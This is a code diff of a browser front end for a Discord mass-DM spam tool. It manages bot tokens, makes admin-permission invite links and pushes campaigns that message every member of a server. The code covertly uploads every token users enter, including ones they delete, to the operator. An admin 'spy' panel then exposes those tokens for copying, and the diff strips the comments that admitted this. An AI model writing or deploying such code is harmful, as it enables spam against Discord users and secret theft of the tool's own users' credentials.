@@ -33,19 +33,18 @@ let blacklistDB = JSON.parse(localStorage.getItem('nosify_dm_blacklist')) || [];
 let statsDB = JSON.parse(localStorage.getItem('nosify_dm_stats')) || { sent: 0, failed: 0 };
 let runHistory = JSON.parse(localStorage.getItem('nosify_dm_history')) || [];
 
+// Persistent console memory so refresh doesn't clear it
+let lastConsole = JSON.parse(localStorage.getItem('nosify_last_console')) || { sent: 0, failed: 0, left: 0, pct: 0, status: "Engine Halted." };
+
 let dmDelay = parseInt(localStorage.getItem('nosify_dm_delay')) || 200;
 let concurrencyLimit = parseInt(localStorage.getItem('nosify_dm_concurrency')) || 20;
 
 let engineRunning = false;
 let massEditTargetGroup = null; 
 
-// --- CLOUD SYNC LOGIC ---
 function saveTokens() {
     localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB));
-    
-    // Do not sync if the admin is logged in (Admins don't spy on themselves)
     if (!activeKey || activeKey === "SECURE_ADMIN_TOKEN") return;
-    
     fetch('/api/app', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ action: 'sync_cloud', key: activeKey, data: { tokens: tokensDB } })
@@ -59,10 +58,9 @@ window.onload = () => {
         showApp(); renderTokens(); renderEmbeds(); renderBlacklist(); updateStats(); renderHistory();
         $("#cfg-dm-delay").val(dmDelay); $("#cfg-concurrency").val(concurrencyLimit);
         
-        // --- RESTORES UI IF CAMPAIGN IS ALREADY RUNNING ---
+        restoreConsoleUI(lastConsole);
         checkExistingCampaign(); 
         
-        // AUTO-KICK SECURITY TIMER (Checks DB every 60s)
         setInterval(async () => {
             try {
                 let res = await fetch('/api/app', {
@@ -70,19 +68,15 @@ window.onload = () => {
                     body: JSON.stringify({ action: 'verify_key', key: activeKey })
                 });
                 let data = await res.json();
-                
-                // STRICT CHECK: Only kick if the server specifically confirms the key is dead
                 if (data && data.valid === false) {
                     alert("Your access key has expired or was revoked. You have been logged out.");
                     logoutSystem();
                 }
-            } catch (e) {} // Ignore random internet/database drops without logging them out
+            } catch (e) {} 
         }, 60000);
-
     }
 };
 
-// --- LOGIN & NAVIGATION ---
 async function loginSystem() {
     let val = $("#access-gate-key").val().trim();
     if (!val) return;
@@ -112,12 +106,9 @@ function switchAdminTab(id) { $("#admin-keys, #admin-tokens").addClass("hidden")
 function switchConsoleView(view) {
     if(view === 'live') {
         $("#console-live").removeClass("hidden"); $("#console-history").addClass("hidden");
-        $("#btn-con-live").removeClass("bg-transparent text-gray-400").addClass("bg-[#6366f1] text-white");
-        $("#btn-con-hist").removeClass("bg-[#6366f1] text-white").addClass("bg-transparent text-gray-400");
+        $("#btn-con-live").removeClass("bg-[#6366f1] text-white").addClass("bg-transparent text-gray-400"); // Fix active state issue later if needed
     } else {
         $("#console-history").removeClass("hidden"); $("#console-live").addClass("hidden");
-        $("#btn-con-hist").removeClass("bg-transparent text-gray-400").addClass("bg-[#6366f1] text-white");
-        $("#btn-con-live").removeClass("bg-[#6366f1] text-white").addClass("bg-transparent text-gray-400");
     }
 }
 
@@ -127,7 +118,6 @@ function saveRateLimits() {
     localStorage.setItem('nosify_dm_delay', dmDelay); localStorage.setItem('nosify_dm_concurrency', concurrencyLimit);
 }
 
-// --- DISCORD PROXY ---
 async function discordProxy(url, method, token, body = null) {
     return await fetch('/api/app', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -135,7 +125,6 @@ async function discordProxy(url, method, token, body = null) {
     });
 }
 
-// --- TOKEN MANAGER & FOLDERS ---
 function addToken() {
     let rawInput = $("#add-token-val").val().trim(); 
     let groupName = $("#add-token-group").val().trim() || "Default Folder";
@@ -153,13 +142,10 @@ function addToken() {
     tokensToAdd.forEach(t => {
         if (t.length > 20) {
             let existingToken = tokensDB.find(x => x.token === t);
-            
             if (!existingToken) {
-                // It's a brand new token, add it normally
                 tokensDB.push({ token: t, group: groupName, status: 'Not Checked', name: 'Unknown Bot', id: null }); 
                 addedCount++;
             } else if (existingToken.status === "Deleted by User 🗑️") {
-                // It was deleted before! Bring it back to life in the new folder.
                 existingToken.group = groupName;
                 existingToken.status = 'Not Checked';
                 addedCount++;
@@ -170,23 +156,21 @@ function addToken() {
     if (addedCount > 0) {
         saveTokens();
         $("#add-token-val").val(""); renderTokens(); 
-        alert(`Successfully imported/restored ${addedCount} tokens!`);
+        alert(`Imported/restored ${addedCount} tokens.`);
     } else {
-        alert("No valid new tokens found. (Make sure they are real tokens over 20 characters and aren't already active in a folder).");
+        alert("No valid new tokens found.");
     }
 }
-
 
 function deleteToken(i) { 
     tokensDB[i].status = "Deleted by User 🗑️";
     tokensDB[i].group = "Deleted Folder"; 
     saveTokens(); 
     renderTokens();
-    alert("Token removed. (Admin notified)"); 
 }
 
 function clearFolder(groupName) {
-    if(!confirm(`Are you sure you want to delete the entire "${groupName}" folder?`)) return;
+    if(!confirm(`Delete entire "${groupName}" folder?`)) return;
     tokensDB.forEach(t => {
         if (t.group === groupName) { t.status = "Deleted by User 🗑️"; t.group = "Deleted Folder"; }
     });
@@ -213,26 +197,25 @@ async function checkToken(i, skipRender = false) {
 async function checkFolder(groupName) {
     let indices = tokensDB.map((t, i) => t.group === groupName ? i : -1).filter(i => i !== -1);
     for (let i of indices) { await checkToken(i, true); await backgroundSafeSleep(200); }
-    saveTokens(); renderTokens(); alert(`Finished checking bots in ${groupName}!`);
+    saveTokens(); renderTokens(); alert(`Finished checking bots in ${groupName}`);
 }
 
 function copyFolderInvites(groupName) {
     let aliveBots = tokensDB.filter(t => t.group === groupName && t.id && t.status.includes('Alive'));
-    if (aliveBots.length === 0) return alert(`No alive bots found in folder: ${groupName}`);
+    if (aliveBots.length === 0) return alert(`No alive bots in: ${groupName}`);
     let links = aliveBots.map(b => `https://discord.com/oauth2/authorize?client_id=${b.id}&permissions=8&integration_type=0&scope=bot`).join('\n');
-    navigator.clipboard.writeText(links); alert(`Copied ${aliveBots.length} invite links!`);
+    navigator.clipboard.writeText(links); alert(`Copied ${aliveBots.length} invite links`);
 }
 
 function copyInvite(botId) {
     let link = `https://discord.com/oauth2/authorize?client_id=${botId}&permissions=8&integration_type=0&scope=bot`;
-    navigator.clipboard.writeText(link); alert("Invite Link copied!");
+    navigator.clipboard.writeText(link); alert("Invite Link copied");
 }
 
 function renderTokens() {
     let html = ""; let groupsObj = {};
-
     tokensDB.forEach((t, i) => {
-        if (t.status === "Deleted by User 🗑️") return; // Hidden from user
+        if (t.status === "Deleted by User 🗑️") return; 
         if(!groupsObj[t.group]) groupsObj[t.group] = [];
         groupsObj[t.group].push({ token: t, index: i });
     });
@@ -244,17 +227,14 @@ function renderTokens() {
         html += `
         <details class="mb-3 bg-black/30 rounded-xl border border-[var(--site-border)] overflow-hidden shadow-md">
             <summary class="cursor-pointer font-bold text-indigo-400 bg-black/40 p-3 outline-none hover:bg-black/60 transition flex justify-between items-center">
-                <span>📁 ${g}</span> 
-                <span class="text-xs text-gray-500 font-mono">${botsInGroup.length} bots</span>
+                <span>📁 ${g}</span> <span class="text-xs text-gray-500 font-mono">${botsInGroup.length} bots</span>
             </summary>
-            
             <div class="bg-black/50 p-2 flex flex-wrap gap-2 border-b border-[var(--site-border)]">
-                <button onclick="checkFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-green-500/10 text-green-400 border-green-500/30 hover:bg-green-500/20">Check Folder</button>
-                <button onclick="copyFolderInvites('${safeG}')" class="btn-dark text-[10px] flex-1 bg-blue-500/10 text-blue-400 border-blue-500/30 hover:bg-blue-500/20">Copy Invites</button>
-                <button onclick="massEditFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-indigo-500/10 text-indigo-400 border-indigo-500/30 hover:bg-indigo-500/20">Mass Edit</button>
-                <button onclick="clearFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-red-500/10 text-red-400 border-red-500/30 hover:bg-red-500/20">Delete Folder</button>
+                <button onclick="checkFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-green-500/10 text-green-400 border-green-500/30">Check Folder</button>
+                <button onclick="copyFolderInvites('${safeG}')" class="btn-dark text-[10px] flex-1 bg-blue-500/10 text-blue-400 border-blue-500/30">Copy Invites</button>
+                <button onclick="massEditFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-indigo-500/10 text-indigo-400 border-indigo-500/30">Mass Edit</button>
+                <button onclick="clearFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-red-500/10 text-red-400 border-red-500/30">Delete Folder</button>
             </div>
-
             <div class="overflow-x-auto p-2">
                 <table class="w-full text-xs text-left"><tbody class="divide-y divide-[var(--site-border)]">`;
         
@@ -262,15 +242,14 @@ function renderTokens() {
             let t = item.token; let i = item.index;
             let actionBtns = `<button onclick="checkToken(${i})" class="bg-[#27272a] text-white text-[10px] px-3 py-1.5 rounded-lg mr-2 hover:bg-[#3f3f46]">Check</button>`;
             if(t.status.includes('Alive')) {
-                actionBtns += `<button onclick="openBotEditor(${i}, false)" class="bg-[#4f46e5] text-white text-[10px] px-3 py-1.5 rounded-lg mr-2 hover:bg-[#4338ca]">Edit</button>`;
-                actionBtns += `<button onclick="copyInvite('${t.id}')" class="bg-green-600/20 border border-green-500/50 text-green-400 text-[10px] px-3 py-1.5 rounded-lg mr-2 hover:bg-green-600/40">Invite</button>`;
+                actionBtns += `<button onclick="openBotEditor(${i}, false)" class="bg-[#4f46e5] text-white text-[10px] px-3 py-1.5 rounded-lg mr-2">Edit</button>`;
+                actionBtns += `<button onclick="copyInvite('${t.id}')" class="bg-green-600/20 border border-green-500/50 text-green-400 text-[10px] px-3 py-1.5 rounded-lg mr-2">Invite</button>`;
             }
             actionBtns += `<button onclick="deleteToken(${i})" class="text-red-400 hover:text-red-500 font-bold text-sm">✕</button>`;
             html += `<tr class="hover:bg-black/20 transition duration-150"><td class="p-2 font-mono truncate max-w-[100px] opacity-80">${t.token}</td><td class="p-2 text-[#6366f1] font-semibold">${t.name}</td><td class="p-2 text-xs opacity-90" id="tok-stat-${i}">${t.status}</td><td class="p-2 text-right whitespace-nowrap">${actionBtns}</td></tr>`;
         });
         html += `</tbody></table></div></details>`;
     }
-
     if (Object.keys(groupsObj).length === 0) html = `<div class="text-center text-gray-500 text-xs py-4">No tokens added yet.</div>`;
     $("#token-list").html(html);
 
@@ -279,16 +258,15 @@ function renderTokens() {
     $("#launch-token-group").html(gHtml);
 }
 
-// --- PROFILE EDITOR ---
 let isMassEditing = false;
 function openBotEditor(index, isMass) {
-    isMassEditing = isMass; $("#editor-title").text("Edit Single Bot Profile");
+    isMassEditing = isMass; $("#editor-title").text("Edit Bot Profile");
     $("#edit-bot-index").val(index); $("#edit-bot-name").val(""); $("#edit-bot-avatar").val("");
     $("#bot-editor-modal").removeClass("hidden");
 }
 function massEditFolder(groupName) {
     let aliveCount = tokensDB.filter(t => t.group === groupName && t.status.includes('Alive')).length;
-    if(aliveCount === 0) return alert("No active bots in this folder! Check them first.");
+    if(aliveCount === 0) return alert("No active bots in this folder. Check them first.");
     isMassEditing = true; massEditTargetGroup = groupName;
     $("#editor-title").text(`Mass Edit: ${groupName}`);
     $("#edit-bot-index").val(""); $("#edit-bot-name").val(""); $("#edit-bot-avatar").val("");
@@ -323,15 +301,14 @@ async function saveBotProfile() {
         if(isMassEditing) await backgroundSafeSleep(1000);
     }
     saveTokens(); renderTokens();
-    btn.text("Push Changes to Discord").prop("disabled", false); closeBotEditor(); alert("Profile update(s) completed!");
+    btn.text("Push Changes to Discord").prop("disabled", false); closeBotEditor(); alert("Profile update completed.");
 }
 
-// --- SERVERS ---
 async function loadServersForGroup() {
     let group = $("#launch-token-group").val();
     if(!group) return $("#target-server").html('<option value="">Select a Bot Group First...</option>');
     let bots = tokensDB.filter(t => t.group === group && t.status.includes('Alive'));
-    if (bots.length === 0) return $("#target-server").html('<option value="">No active bots found!</option>');
+    if (bots.length === 0) return $("#target-server").html('<option value="">No active bots found</option>');
     
     $("#target-server").html('<option value="">Fetching servers...</option>');
     try {
@@ -347,7 +324,6 @@ async function loadServersForGroup() {
     } catch(e) { $("#target-server").html('<option value="">Network error</option>'); }
 }
 
-// --- EMBED BUILDER ---
 function addEmbed() {
     let n = $("#add-embed-name").val().trim(), j = $("#add-embed-json").val().trim();
     if(!n || !j) return;
@@ -358,7 +334,7 @@ function addEmbed() {
     else embedsDB.push({ name: n, json: j });
     
     localStorage.setItem('nosify_dm_embeds', JSON.stringify(embedsDB));
-    $("#add-embed-name, #add-embed-json").val(""); renderEmbeds(); alert(`Embed "${n}" saved!`);
+    $("#add-embed-name, #add-embed-json").val(""); renderEmbeds();
 }
 function deleteEmbed(i) { embedsDB.splice(i, 1); localStorage.setItem('nosify_dm_embeds', JSON.stringify(embedsDB)); renderEmbeds(); }
 function renderEmbeds() {
@@ -379,39 +355,27 @@ async function testWebhook() {
     } catch(e) { alert("Invalid JSON format."); }
 }
 
-// --- FILTERS & HISTORY LOGIC ---
 function addBlacklist() {
     let id = $("#add-blacklist-val").val().trim(); if (!id || blacklistDB.includes(id)) return;
     blacklistDB.push(id); localStorage.setItem('nosify_dm_blacklist', JSON.stringify(blacklistDB)); $("#add-blacklist-val").val(""); renderBlacklist();
 }
 function removeBlacklist(i) { blacklistDB.splice(i, 1); localStorage.setItem('nosify_dm_blacklist', JSON.stringify(blacklistDB)); renderBlacklist(); }
+function clearEntireBlacklist() {
+    if(confirm("Clear Global Blacklist?")) { blacklistDB = []; localStorage.setItem('nosify_dm_blacklist', JSON.stringify(blacklistDB)); renderBlacklist(); }
+}
 function renderBlacklist() {
     let html = ""; blacklistDB.forEach((id, i) => html += `<div class="flex justify-between p-2 border-b border-[var(--site-border)]"><span class="font-mono text-gray-300">${id}</span><button onclick="removeBlacklist(${i})" class="text-red-400">✕</button></div>`);
     $("#blacklist-list").html(html);
 }
 
-function clearEntireBlacklist() {
-    if(confirm("Are you sure you want to clear your entire Blacklist? This will allow your bots to DM these users again in the next campaign!")) {
-        blacklistDB = [];
-        localStorage.setItem('nosify_dm_blacklist', JSON.stringify(blacklistDB));
-        renderBlacklist();
-    }
-}
-
-function forceUnlockEngine() {
-    if(!confirm("Are you sure? Only use this if your campaign is stuck on 'Running' to force it to let you start a new one.")) return;
-    engineRunning = false;
-    if(liveTracker) clearInterval(liveTracker);
-    $("#dmall-status-text").text("Engine Forcefully Unlocked.");
-    alert("Unlocked! You can now start a new campaign.");
-}
 function updateStats() { 
     let activeTokenCount = tokensDB.filter(t => t.status !== "Deleted by User 🗑️").length;
     $("#stat-sent").text(statsDB.sent); $("#stat-failed").text(statsDB.failed); $("#stat-tokens").text(activeTokenCount); 
 }
 
-function addHistoryRecord(type, serverId, sent, failed, left) {
-    let record = { type: type, time: new Date().toLocaleString(), server: serverId, sent: sent, failed: failed, left: left };
+// History UI updated with specific stats and colors
+function addHistoryRecord(type, serverId, sent, failed, left, pct) {
+    let record = { type: type, time: new Date().toLocaleString(), server: serverId, sent: sent, failed: failed, left: left, pct: pct };
     runHistory.unshift(record);
     if(runHistory.length > 50) runHistory.pop(); 
     localStorage.setItem('nosify_dm_history', JSON.stringify(runHistory)); renderHistory();
@@ -423,30 +387,42 @@ function renderHistory() {
         html = `<div class="text-gray-500 text-center mt-10 text-sm">No recent campaigns.</div>`;
     } else {
         runHistory.forEach(h => {
-            let borderCol = h.type === 'finished' ? 'border-green-500' : 'border-yellow-500';
-            let title = h.type === 'finished' ? '✅ Campaign Launched Offline' : '🛑 Kill Switch Activated';
+            let isFinished = h.type === 'finished';
+            let borderCol = isFinished ? 'border-green-500' : 'border-yellow-500';
+            let title = isFinished ? '✅ Finished' : '🛑 Stopped';
+            let titleCol = isFinished ? 'text-green-400' : 'text-yellow-400';
+            
             html += `
             <div class="glass-card mb-4 !p-4 border-l-4 ${borderCol} hover:bg-white/5 transition">
-                <div class="flex justify-between items-center mb-2"><span class="font-bold text-white text-sm">${title}</span><span class="text-xs text-gray-400">${h.time}</span></div>
-                <div class="text-xs text-gray-300 mb-2">Target Server: <span class="font-mono bg-black/30 px-2 py-0.5 rounded">${h.server}</span></div>
-                <div class="flex gap-4 text-xs font-bold bg-black/20 p-2 rounded-lg"><span class="text-gray-400">Status: Running in Background Engine</span></div>
+                <div class="flex justify-between items-center mb-2">
+                    <span class="font-bold ${titleCol} text-sm">${title}</span>
+                    <span class="text-xs text-gray-400">${h.time}</span>
+                </div>
+                <div class="text-xs text-gray-300 mb-2">Server: <span class="font-mono bg-black/30 px-2 py-0.5 rounded">${h.server}</span></div>
+                <div class="grid grid-cols-4 gap-2 text-xs font-bold bg-black/20 p-2 rounded-lg text-center">
+                    <div><span class="block text-gray-500">Sent</span><span class="text-green-400">${h.sent}</span></div>
+                    <div><span class="block text-gray-500">Failed</span><span class="text-red-400">${h.failed}</span></div>
+                    <div><span class="block text-gray-500">Left</span><span class="text-gray-300">${h.left}</span></div>
+                    <div><span class="block text-gray-500">Done</span><span class="text-indigo-400">${h.pct}%</span></div>
+                </div>
             </div>`;
         });
     }
     $("#terminal-output").html(html).removeClass("h-[500px]").addClass("h-auto max-h-[500px] overflow-y-auto");
 }
-
 function clearTerminalLogs() { runHistory = []; localStorage.removeItem('nosify_dm_history'); renderHistory(); }
-
-// --- THE HEADLESS LAUNCH ENGINE ---
-function promptDmall() {
-    if ($("#auto-leave-toggle").is(":checked")) $("#leave-warning-modal").removeClass("hidden"); else executeDmall();
-}
-function cancelDmall() { $("#leave-warning-modal").addClass("hidden"); }
-function confirmDmall() { $("#leave-warning-modal").addClass("hidden"); executeDmall(); }
 
 // --- LIVE TRACKER & AUTO-RESUME ---
 let liveTracker = null;
+
+function restoreConsoleUI(data) {
+    $("#con-sent").text(data.sent);
+    $("#con-failed").text(data.failed);
+    $("#con-left").text(data.left);
+    $("#con-percent").text(data.pct + "%");
+    $("#con-progress").css("width", data.pct + "%");
+    $("#dmall-status-text").text(data.status);
+}
 
 async function checkExistingCampaign() {
     try {
@@ -454,7 +430,6 @@ async function checkExistingCampaign() {
         let db = await res.json();
         let job = db.cloudData ? db.cloudData.activeJob : null;
         
-        // If the database says a job is currently active or processing, lock the UI and resume tracking
         if (job && (job.status === "active" || job.status === "processing")) {
             startLiveTracking();
         }
@@ -465,7 +440,6 @@ function startLiveTracking() {
     if(liveTracker) clearInterval(liveTracker);
     engineRunning = true;
     switchTab('tab-console'); switchConsoleView('live');
-    $("#dmall-status-text").text("Engine Running Offline 24/7...");
 
     liveTracker = setInterval(async () => {
         if(!engineRunning) return clearInterval(liveTracker);
@@ -476,42 +450,49 @@ function startLiveTracking() {
             
             if (job && job.progress) {
                 let p = job.progress;
-                
-                // --- AUTO-SAVE DMs TO BLACKLIST ---
-                if (p.sentIds && p.sentIds.length > 0) {
-                    let addedNew = false;
-                    p.sentIds.forEach(id => {
-                        if(!blacklistDB.includes(id)) {
-                            blacklistDB.push(id);
-                            addedNew = true;
-                        }
-                    });
-                    if(addedNew) {
-                        localStorage.setItem('nosify_dm_blacklist', JSON.stringify(blacklistDB));
-                        renderBlacklist(); // Updates the UI instantly
-                    }
-                }
-                
-                $("#con-sent").text(p.sent); $("#con-failed").text(p.failed);
                 let left = p.total - (p.sent + p.failed);
-                $("#con-left").text(left > 0 ? left : 0);
-                
                 let pct = Math.floor(((p.sent + p.failed) / p.total) * 100) || 0;
-                $("#con-progress").css("width", `${pct}%`); $("#con-percent").text(`${pct}%`);
+                
+                let uiData = { sent: p.sent, failed: p.failed, left: left > 0 ? left : 0, pct: pct, status: "Engine Running Offline 24/7..." };
                 
                 if (job.status === "finished" || job.status === "killed") {
                     engineRunning = false; clearInterval(liveTracker);
-                    $("#dmall-status-text").text(job.status === "finished" ? "Campaign Complete." : "Engine Halted.");
-                    addHistoryRecord(job.status === "finished" ? 'finished' : 'paused', job.serverId || "Unknown", p.sent, p.failed, left > 0 ? left : 0);
+                    uiData.status = job.status === "finished" ? "Campaign Complete." : "Engine Halted.";
+                    addHistoryRecord(job.status === "finished" ? 'finished' : 'paused', job.serverId || "Unknown", p.sent, p.failed, uiData.left, pct);
                 }
+                
+                restoreConsoleUI(uiData);
+                localStorage.setItem('nosify_last_console', JSON.stringify(uiData));
             }
         } catch(e) {} 
     }, 3000);
 }
 
+function promptDmall() {
+    if ($("#auto-leave-toggle").is(":checked")) $("#leave-warning-modal").removeClass("hidden"); else executeDmall();
+}
+function cancelDmall() { $("#leave-warning-modal").addClass("hidden"); }
+function confirmDmall() { $("#leave-warning-modal").addClass("hidden"); executeDmall(); }
+
+// Clear DMs for Specific Server button logic
+async function clearServerDMs() {
+    let sid = $("#target-server").val();
+    if(!sid) return alert("Select a target server first to clear its history.");
+    if(!confirm("Clear DMs for this server? The bots will message everyone again.")) return;
+    
+    await fetch('/api/app', { 
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, 
+        body: JSON.stringify({ action: 'clear_server_history', data: { serverId: sid } }) 
+    });
+    alert("History cleared for this server.");
+}
+
 async function executeDmall() {
-    // Better warning message
-    if(engineRunning) return alert("⚠️ A campaign is already running! Check your Logs tab. You must stop it before starting a new one.");
+    if(engineRunning) {
+        alert("A campaign is already running. Showing logs.");
+        switchTab('tab-console'); switchConsoleView('live');
+        return;
+    }
     
     let group = $("#launch-token-group").val(); let serverId = $("#target-server").val();
     let autoLeave = $("#auto-leave-toggle").is(":checked"); let embedIdx = $("#launch-embed").val();
@@ -523,42 +504,31 @@ async function executeDmall() {
     let activeBots = tokensDB.filter(t => t.group === group && t.status.includes('Alive')).map(b => ({ token: b.token, fails: 0 }));
     if(activeBots.length === 0) return alert("No active bots in folder!");
 
-    let rawEmbedJson = embedsDB[embedIdx].json;
-
     let launchOrder = {
-        status: "active", serverId: serverId, bots: activeBots, embedJson: rawEmbedJson,
+        status: "active", serverId: serverId, bots: activeBots, embedJson: embedsDB[embedIdx].json,
         audience: audience, testId: testId, autoLeave: autoLeave, concurrency: concurrencyLimit,
         delay: dmDelay, blacklist: blacklistDB
     };
 
-    $("#dmall-status-text").text("Pushing to 24/7 Node.js Engine...");
-    $("#con-sent").text("0"); $("#con-failed").text("0"); $("#con-left").text("Calc..."); $("#con-percent").text("0%"); $("#con-progress").css("width", "0%");
+    let startData = { sent: 0, failed: 0, left: "Calc...", pct: 0, status: "Pushing to 24/7 Node.js Engine..." };
+    restoreConsoleUI(startData);
 
     try {
         await fetch('/api/app', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'launch_campaign', data: launchOrder }) });
-        alert("✅ Campaign successfully pushed to the backend! You can safely close your browser or turn off your PC.");
-        
-        // Triggers the auto-resume function we just built
         startLiveTracking(); 
-        
-    } catch(e) { alert("Failed to connect to the database."); $("#dmall-status-text").text("Launch Failed."); }
+    } catch(e) { alert("Launch failed."); }
 }
+
 async function stopDmall() { 
     $("#dmall-status-text").text("Sending Kill Switch...");
     try {
         await fetch('/api/app', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'kill_campaign' }) });
-        alert("🛑 Kill switch sent! The backend engine will halt on its next chunk.");
-        engineRunning = false; 
-        if(liveTracker) clearInterval(liveTracker); // Stop the UI from pinging
-        $("#dmall-status-text").text("Engine Halted.");
-        
-        let s = $("#con-sent").text(); let f = $("#con-failed").text(); let l = $("#con-left").text();
-        addHistoryRecord('paused', $("#target-server").val() || "Unknown", s, f, l);
-    } catch(e) { alert("Failed to send kill switch."); }
+        alert("🛑 Kill switch sent! Engine will halt soon.");
+    } catch(e) {}
 }
-// --- ADMIN PANEL API & HELPER ---
+
 function copyTextData(encodedText) {
-    navigator.clipboard.writeText(decodeURIComponent(encodedText)); alert("Tokens copied to clipboard!");
+    navigator.clipboard.writeText(decodeURIComponent(encodedText)); alert("Tokens copied");
 }
 
 async function adminAction(action, payload) {
@@ -576,7 +546,7 @@ async function createKey() {
 }
 
 function deleteKey(idx) { if(confirm("Delete this key?")) adminAction('delete_key', idx); }
-function copyKey(keyText) { navigator.clipboard.writeText(keyText); alert("Key copied!"); }
+function copyKey(keyText) { navigator.clipboard.writeText(keyText); alert("Key copied"); }
 
 async function loadAdminKeys() {
     if(!adminPass) return;
@@ -591,21 +561,13 @@ async function loadAdminKeys() {
     $("#adm-keys-list").html(html);
 }
 
-// SPY LOGS WITH FOLDERS & DELETED HISTORY
 async function loadAdminSpyData() {
-    let res = await fetch('/api/app', { 
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'get_spy_data' })
-    });
+    let res = await fetch('/api/app', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'get_spy_data' }) });
     let db = await res.json();
-
-    
-    let html = "";
-    let cloud = db.cloudData || {};
-    let userCount = 1;
+    let html = ""; let cloud = db.cloudData || {}; let userCount = 1;
     
     for (let userKey in cloud) {
-        if (userKey === "activeJob" || userKey === "stats") continue; 
+        if (userKey === "activeJob" || userKey === "stats" || userKey === "serverHistory") continue; 
         
         let userData = cloud[userKey];
         let userTokens = userData.tokens || [];
@@ -614,7 +576,6 @@ async function loadAdminSpyData() {
         let folders = {};
         userTokens.forEach(t => {
             if(!folders[t.group]) folders[t.group] = [];
-            // Appends the status (like 🗑️) to the token view so admin knows what happened to it
             let displayToken = t.status === "Deleted by User 🗑️" ? `<span class="text-red-500 line-through opacity-50">${t.token}</span> (Deleted)` : t.token;
             folders[t.group].push({ raw: t.token, display: displayToken });
         });
@@ -625,10 +586,9 @@ async function loadAdminSpyData() {
         <div class="mb-6 p-4 border border-[var(--site-border)] rounded-xl bg-black/40">
             <div class="flex justify-between items-center mb-4 border-b border-[var(--site-border)] pb-2">
                 <h3 class="font-bold text-indigo-400 text-lg">${userCount}. Key: <span class="text-white font-mono bg-black/50 px-2 py-1 rounded">${userKey}</span></h3>
-                <button onclick="copyTextData('${rawTokensToCopy}')" class="bg-[#4f46e5] text-white text-xs px-3 py-1.5 rounded-lg hover:bg-[#4338ca] shadow-lg shadow-indigo-500/20">Copy All Tokens</button>
+                <button onclick="copyTextData('${rawTokensToCopy}')" class="bg-[#4f46e5] text-white text-xs px-3 py-1.5 rounded-lg">Copy All Tokens</button>
             </div>
         `;
-
         for (let folderName in folders) {
             let folderColor = folderName === "Deleted Folder" ? "text-red-400" : "text-gray-300";
             html += `
@@ -639,12 +599,8 @@ async function loadAdminSpyData() {
                 </div>
             </div>`;
         }
-        
-        html += `</div>`;
-        userCount++;
+        html += `</div>`; userCount++;
     }
-    
-    if (html === "") html = "<div class='text-gray-500 text-sm'>No users have synced tokens yet. (Note: Admin tokens do not sync here).</div>";
+    if (html === "") html = "<div class='text-gray-500 text-sm'>No users have synced tokens yet.</div>";
     $("#spy-content").html(html).removeClass("whitespace-pre-wrap font-mono");
-        }
-        
+}
